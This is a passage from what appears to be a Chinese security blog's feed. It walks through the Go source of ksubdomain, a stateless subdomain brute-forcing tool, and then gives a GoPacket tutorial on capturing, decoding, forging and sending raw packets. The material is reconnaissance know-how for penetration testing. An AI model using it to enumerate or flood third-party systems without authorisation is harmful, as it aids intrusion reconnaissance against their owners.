class="hljs-keyword">if</span> !ok &#123;<br>v = statusdb.Item&#123;<br>Domain:      domain,<br>                <span class="hljs-comment">// 获取一个随机的 DNS 服务器地址, 或者根据域名获取特殊的 DNS 服务器地址</span><br>Dns:         r.choseDns(domain),<br>Time:        time.Now(),<br>Retry:       <span class="hljs-number">0</span>,<br>DomainLevel: <span class="hljs-number">0</span>,<br>&#125;<br>r.hm.Add(domain, v)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 重试次数 +1</span><br>v.Retry += <span class="hljs-number">1</span><br>v.Time = time.Now()<br>v.Dns = r.choseDns(domain)<br>r.hm.Set(domain, v)<br>&#125;<br><span class="hljs-comment">// 发送操作</span><br>send(domain, v.Dns, r.options.EtherInfo, r.dnsid, <span class="hljs-type">uint16</span>(r.freeport), r.handle, r.dnsType)<br><span class="hljs-comment">// 并发安全的计数器 +1</span><br>atomic.AddUint64(&amp;r.sendIndex, <span class="hljs-number">1</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下 <code>send</code> 使用<code>pacp</code> 网卡进行发包：</p><p>其实就是模拟一个 DNS 协议的包，然后在 DNS 的 ID 字段携带一个标识，这个就是用来区分是否为 Ksubdomain 发送的请求包。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// send 使用 gopacket 去发送数据包</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">send</span><span class="hljs-params">(domain <span class="hljs-type">string</span>, dnsname <span class="hljs-type">string</span>, ether *device.EtherTable, dnsid <span class="hljs-type">uint16</span>, freeport <span class="hljs-type">uint16</span>, handle *pcap.Handle, dnsType layers.DNSType)</span></span> &#123;<br>    <span class="hljs-comment">// dns 服务器地址</span><br>DstIp := net.ParseIP(dnsname).To4()<br>eth := &amp;layers.Ethernet&#123;<br>SrcMAC:       ether.SrcMac.HardwareAddr(),<br>DstMAC:       ether.DstMac.HardwareAddr(),<br>EthernetType: layers.EthernetTypeIPv4,<br>&#125;<br><span class="hljs-comment">// Our IPv4 header</span><br>ip := &amp;layers.IPv4&#123;<br>Version:    <span class="hljs-number">4</span>,<br>IHL:        <span class="hljs-number">5</span>,<br>TOS:        <span class="hljs-number">0</span>,<br>Length:     <span class="hljs-number">0</span>, <span class="hljs-comment">// FIX</span><br>Id:         <span class="hljs-number">0</span>,<br>Flags:      layers.IPv4DontFragment,<br>FragOffset: <span class="hljs-number">0</span>,<br>TTL:        <span class="hljs-number">255</span>,<br>Protocol:   layers.IPProtocolUDP,<br>Checksum:   <span class="hljs-number">0</span>,<br>SrcIP:      ether.SrcIp,<br>DstIP:      DstIp,<br>&#125;<br><span class="hljs-comment">// Our UDP header</span><br>udp := &amp;layers.UDP&#123;<br>SrcPort: layers.UDPPort(freeport),<br>DstPort: layers.UDPPort(<span class="hljs-number">53</span>),<br>&#125;<br><span class="hljs-comment">// Our DNS header</span><br>dns := &amp;layers.DNS&#123;<br>        <span class="hljs-comment">// Ksubdomain 的标识 0x2021 </span><br>ID:      dnsid,<br>QDCount: <span class="hljs-number">1</span>,<br>RD:      <span class="hljs-literal">true</span>, <span class="hljs-comment">//递归查询标识</span><br>&#125;<br>dns.Questions = <span class="hljs-built_in">append</span>(dns.Questions,<br>layers.DNSQuestion&#123;<br>Name:  []<span class="hljs-type">byte</span>(domain),<br>Type:  dnsType,<br>Class: layers.DNSClassIN,<br>&#125;)<br><span class="hljs-comment">// Our UDP header</span><br>_ = udp.SetNetworkLayerForChecksum(ip)<br>buf := gopacket.NewSerializeBuffer()<br>    <span class="hljs-comment">// 把所有层序列化到缓冲区中</span><br>err := gopacket.SerializeLayers(<br>buf,<br>gopacket.SerializeOptions&#123;<br>ComputeChecksums: <span class="hljs-literal">true</span>, <span class="hljs-comment">// automatically compute checksums</span><br>FixLengths:       <span class="hljs-literal">true</span>,<br>&#125;,<br>eth, ip, udp, dns,<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Warningf(<span class="hljs-string">&quot;SerializeLayers faild:%s\n&quot;</span>, err.Error())<br>&#125;<br>    <span class="hljs-comment">// 发送</span><br>err = handle.WritePacketData(buf.Bytes())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>gologger.Warningf(<span class="hljs-string">&quot;WritePacketDate error:%s\n&quot;</span>, err.Error())<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下接收操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> recvChanel(ctx context.Context) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">var</span> (<br>snapshotLen = <span class="hljs-number">65536</span><br>timeout     = <span class="hljs-number">-1</span> * time.Second<br>err         <span class="hljs-type">error</span><br>)<br><span class="hljs-comment">// 创建一个 pcap 句柄</span><br>inactive, err := pcap.NewInactiveHandle(r.options.EtherInfo.Device)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>err = inactive.SetSnapLen(snapshotLen)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> inactive.CleanUp()<br><span class="hljs-keyword">if</span> err = inactive.SetTimeout(timeout); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>err = inactive.SetImmediateMode(<span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 启动开始监听抓包</span><br>handle, err := inactive.Activate()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> handle.Close()<br><span class="hljs-comment">// 设置过滤器</span><br>err = handle.SetBPFFilter(fmt.Sprintf(<span class="hljs-string">&quot;udp and src port 53 and dst port %d&quot;</span>, r.freeport))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> errors.New(fmt.Sprintf(<span class="hljs-string">&quot;SetBPFFilter Faild:%s&quot;</span>, err.Error()))<br>&#125;<br><br><span class="hljs-comment">// Listening</span><br><br><span class="hljs-keyword">var</span> udp layers.UDP<br><span class="hljs-keyword">var</span> dns layers.DNS<br><span class="hljs-keyword">var</span> eth layers.Ethernet<br><span class="hljs-keyword">var</span> ipv4 layers.IPv4<br><span class="hljs-keyword">var</span> ipv6 layers.IPv6<br><span class="hljs-comment">// 解码器</span><br>parser := gopacket.NewDecodingLayerParser(<br>layers.LayerTypeEthernet, &amp;eth, &amp;ipv4, &amp;ipv6, &amp;udp, &amp;dns)<br><br><span class="hljs-keyword">var</span> data []<span class="hljs-type">byte</span><br><span class="hljs-keyword">var</span> decoded []gopacket.LayerType<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">default</span>:<br>data, _, err = handle.ReadPacketData()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>err = parser.DecodeLayers(data, &amp;decoded)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 是否为应答报文</span><br><span class="hljs-keyword">if</span> !dns.QR &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 是否为 Ksubdomain 发送的数据包</span><br><span class="hljs-keyword">if</span> dns.ID != r.dnsid &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// DNS 请求成功计数器 +1</span><br>atomic.AddUint64(&amp;r.recvIndex, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dns.Questions) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 获取可解析的子域名</span><br>subdomain := <span class="hljs-type">string</span>(dns.Questions[<span class="hljs-number">0</span>].Name)<br><span class="hljs-comment">// 从 Map 中删除, 这里就证明了 DNS 请求成功, 但不能确定是否可解析</span><br>r.hm.Del(subdomain)<br><span class="hljs-comment">// 看是否有答案返回, 有说明是可解析的, 也就是一个存在的域名</span><br><span class="hljs-keyword">if</span> dns.ANCount &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 成功的计数器 +1</span><br>atomic.AddUint64(&amp;r.successIndex, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">var</span> answers []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> dns.Answers &#123;<br><span class="hljs-comment">// 获取答案记录值, A,AAA...</span><br>answer, err := dnsRecord2String(v)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>answers = <span class="hljs-built_in">append</span>(answers, answer)<br>&#125;<br><span class="hljs-comment">// 放入结果通道</span><br>r.recver &lt;- result.Result&#123;<br>Subdomain: subdomain,<br>Answers:   answers,<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里抓下包，这个 ID 就是 “无状态” 模式下，确定是 Ksubdomain 的方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309162227404.png" alt="image-20230916222710286"></p><p>再看一下重试机制：</p><p>当目标域名发送完成后就开启重试协程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *runner)</span></span> retry(ctx context.Context) &#123;<br>t := time.NewTicker(<span class="hljs-number">1</span> * time.Second)<br><span class="hljs-keyword">defer</span> t.Stop()<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> &lt;-t.C:<br>now := time.Now()<br>r.hm.Scan(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key <span class="hljs-type">string</span>, v statusdb.Item)</span></span> <span class="hljs-type">error</span> &#123;<br>                <span class="hljs-comment">// 当前重试次数 &gt; 0 且 当前重试次数 &gt; 最大重试次数</span><br><span class="hljs-keyword">if</span> r.maxRetry &gt; <span class="hljs-number">0</span> &amp;&amp; v.Retry &gt; r.maxRetry &#123;<br>r.hm.Del(key)<br>atomic.AddUint64(&amp;r.faildIndex, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>                <span class="hljs-comment">// 数据包发送的时间和当前时间是否超过指定的超时时间</span><br><span class="hljs-keyword">if</span> <span class="hljs-type">int64</span>(now.Sub(v.Time)) &gt;= r.timeout &#123;<br><span class="hljs-comment">// 重新发送</span><br>r.sender &lt;- key<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 Scan 就是去遍历每一个键值对，然后去进行重试方面的测试：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *StatusDb)</span></span> Scan(f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key <span class="hljs-type">string</span>, value Item)</span></span> <span class="hljs-type">error</span>) &#123;<br>r.Items.Range(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(key, value <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">bool</span> &#123;<br>k := key.(<span class="hljs-type">string</span>)<br>item := value.(Item)<br>f(k, item)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是 <code>defer cancel()</code>，关闭各种管道啥的</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309162246765.png" alt="image-20230916224651715" style="zoom:67%;" /><h3 id="验证模式"><a href="#验证模式" class="headerlink" title="验证模式"></a>验证模式</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://paper.seebug.org/1325/">ksubdomain 无状态域名爆破工具</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>源码学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GoPacket</title>
    <link href="/2023/09/15/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/GoPacket/"/>
    <url>/2023/09/15/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/GoPacket/</url>
    
    <content type="html"><![CDATA[<h1 id="GoPacket"><a href="#GoPacket" class="headerlink" title="GoPacket"></a>GoPacket</h1><p>GoPacket 是对  libpcap 和 npcap 的 go 封装，其功能就是抓包。</p><p>在分析 ksubdomain 时遇到这个库，简单看一下用法。</p><p>像 wireshark 这种抓包软件其底层使用的就是 npcap，所以说 GoPacket 库的功能也就类似这种。</p><p>项目地址：<a href="https://github.com/google/gopacket">https://github.com/google/gopacket</a></p><p>应用场景：</p><ol><li>网络流量分析</li><li>伪造数据包</li><li>离线 pcap 文件的读取</li></ol><p>在使用 <code>gopacket</code> 包时，首先要确保在 windows 平台下安装了 <code>npcap</code> 或 <code>winpcap</code>，或者是在 linux 平台下安装了 <code>libpcap</code> 库。</p><ul><li><code>npcap</code>：<a href="https://nmap.org/npcap">https://nmap.org/npcap</a></li><li><code>libpcap</code>：<a href="https://www.tcpdump.org/">https://www.tcpdump.org</a></li></ul><p>库安装：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/google/gopacket<br></code></pre></td></tr></table></figure><h2 id="抓取数据包"><a href="#抓取数据包" class="headerlink" title="抓取数据包"></a>抓取数据包</h2><h3 id="获取网络设备"><a href="#获取网络设备" class="headerlink" title="获取网络设备"></a>获取网络设备</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>devs, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">for</span> _, dev := <span class="hljs-keyword">range</span> devs &#123;<br><span class="hljs-keyword">for</span> _, addr := <span class="hljs-keyword">range</span> dev.Addresses &#123;<br>fmt.Println(dev.Name, <span class="hljs-string">&quot;=&gt;&quot;</span>, addr.IP.String())<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>设备信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Interface describes a single network interface on a machine.</span><br><span class="hljs-keyword">type</span> Interface <span class="hljs-keyword">struct</span> &#123;<br>Name        <span class="hljs-type">string</span><br>Description <span class="hljs-type">string</span><br>Flags       <span class="hljs-type">uint32</span><br>Addresses   []InterfaceAddress<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Addresses</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> InterfaceAddress <span class="hljs-keyword">struct</span> &#123;<br>IP        net.IP<br>Netmask   net.IPMask <span class="hljs-comment">// Netmask may be nil if we were unable to retrieve it.</span><br>Broadaddr net.IP     <span class="hljs-comment">// Broadcast address for this IP may be nil</span><br>P2P       net.IP     <span class="hljs-comment">// P2P destination address for this IP may be nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实时抓包"><a href="#实时抓包" class="headerlink" title="实时抓包"></a>实时抓包</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>device             = <span class="hljs-string">&quot;\\Device\\NPF_&#123;657E0D44-808F-42EA-82B5-AFAFF6AE862B&#125;&quot;</span> <span class="hljs-comment">// 设备名称</span><br>snapshot_len <span class="hljs-type">int32</span> = <span class="hljs-number">1024</span>                                                   <span class="hljs-comment">// 读取数据包的最大长度</span><br>promiscuous        = <span class="hljs-literal">false</span>                                                  <span class="hljs-comment">// 混杂模式 ( 接受目的地不是本机的包 )</span><br>timeout            = <span class="hljs-number">-1</span> * time.Second                                       <span class="hljs-comment">// 抓包超时, -1 表示立即刷新数据包</span><br>err          <span class="hljs-type">error</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 打开网络设备</span><br>handle, err := pcap.OpenLive(device, snapshot_len, promiscuous, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> handle.Close()<br>handle.SetBPFFilter(<span class="hljs-string">&quot;dns&quot;</span>)<br><span class="hljs-comment">// 创建数据包源, handle.LinkType() =&gt; 以太网链路</span><br>packetSource := gopacket.NewPacketSource(handle, handle.LinkType())<br><span class="hljs-comment">// 读取数据包</span><br><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packetSource.Packets() &#123;<br>fmt.Println(packet.String())<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>设置过滤器：<code>handle.SetBPFFilter(&quot;dns&quot;)</code></p><p>创建数据包源：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">packetSource := gopacket.NewPacketSource(handle, handle.LinkType())<br></code></pre></td></tr></table></figure><p>读取一次数据包：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">packet, _ := packetSource.NextPacket()<br></code></pre></td></tr></table></figure><p>获得一个读取所有数据包的通道：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packetSource.Packets() &#123;<br>    fmt.Println(packet.String())<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="写入读取"><a href="#写入读取" class="headerlink" title="写入读取"></a>写入读取</h3><p>读取 <code>pcap</code> 文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">handle, _ = pcap.OpenOffline(<span class="hljs-string">&quot;dump.pcap&quot;</span>)<br><span class="hljs-keyword">defer</span> handle.Close()<br></code></pre></td></tr></table></figure><p>写入 <code>pcap</code> 文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">dumpFile, _ := os.Create(<span class="hljs-string">&quot;dump.pcap&quot;</span>)<br><span class="hljs-keyword">defer</span> dumpFile.Close()<br>packetWriter := pcapgo.NewWriter(dumpFile)<br>packet := packetSource.Packets()<br><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packet&#123;<br>    packetWriter.WritePacket(packet.Metadata().CaptureInfo, packet.Data())<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="数据包解码"><a href="#数据包解码" class="headerlink" title="数据包解码"></a>数据包解码</h2><p>Layers 包是 gopacket 的 Go 库中的新功能，在底层 libpcap 库中不存在。它是 gopacket 库的非常有用的一部分。它允许我们轻松地识别数据包是否包含特定类型的层。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, layer := <span class="hljs-keyword">range</span> packet.Layers() &#123;<br>    fmt.Println(layer.LayerType().String())<span class="hljs-comment">// 当前层的类型 (TCP/DNS/UDP...)</span><br>    fmt.Println(layer.LayerContents())<br>    fmt.Println(layer.LayerPayload())<br>&#125;<br></code></pre></td></tr></table></figure><p>分析某层的数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> packet := <span class="hljs-keyword">range</span> packetSource.Packets() &#123;<br>    <span class="hljs-comment">// 判断数据包是否为 dns 数据包</span><br>    dnsLayer := packet.Layer(layers.LayerTypeDNS)<br>    <span class="hljs-keyword">if</span> dnsLayer != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-comment">// 断言为 DNS 类型</span><br>        dns := dnsLayer.(*layers.DNS)<br>        <span class="hljs-keyword">for</span> _, q := <span class="hljs-keyword">range</span> dns.Questions &#123;<br>            <span class="hljs-comment">// 遍历 Questions 输出 Name</span><br>            fmt.Println(<span class="hljs-type">string</span>(q.Name))<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="创建与发送"><a href="#创建与发送" class="headerlink" title="创建与发送"></a>创建与发送</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>创建一个新的序列化缓冲区；然后把所有层序列化到缓冲区中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">buffer := gopacket.NewSerializeBuffer()<br>options := gopacket.SerializeOptions&#123;&#125;<br>gopacket.SerializeLayers(buffer, options, &amp;layers.Ethernet&#123;&#125;, &amp;layers.IPv4&#123;&#125;, &amp;layers.TCP&#123;&#125;, gopacket.Payload([]<span class="hljs-type">byte</span>&#123;<span class="hljs-number">65</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>&#125;))<br></code></pre></td></tr></table></figure><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">handle.WritePacketData(buffer.Bytes())<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/weixin_49393427/article/details/112362561">gopacket 使用手册 学习笔记 中文文档</a></li><li><a href="https://colobu.com/2019/06/01/packet-capture-injection-and-analysis-gopacket/">[译]利用 gopackage 进行包的捕获、注入和分析</a></li><li><a href="https://zhuanlan.zhihu.com/p/361737169">【酷Go推荐】网络流量抓包库 gopacket</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
      <category>第三方库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透基础-2</title>
    <link href="/2023/09/14/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-2/"/>
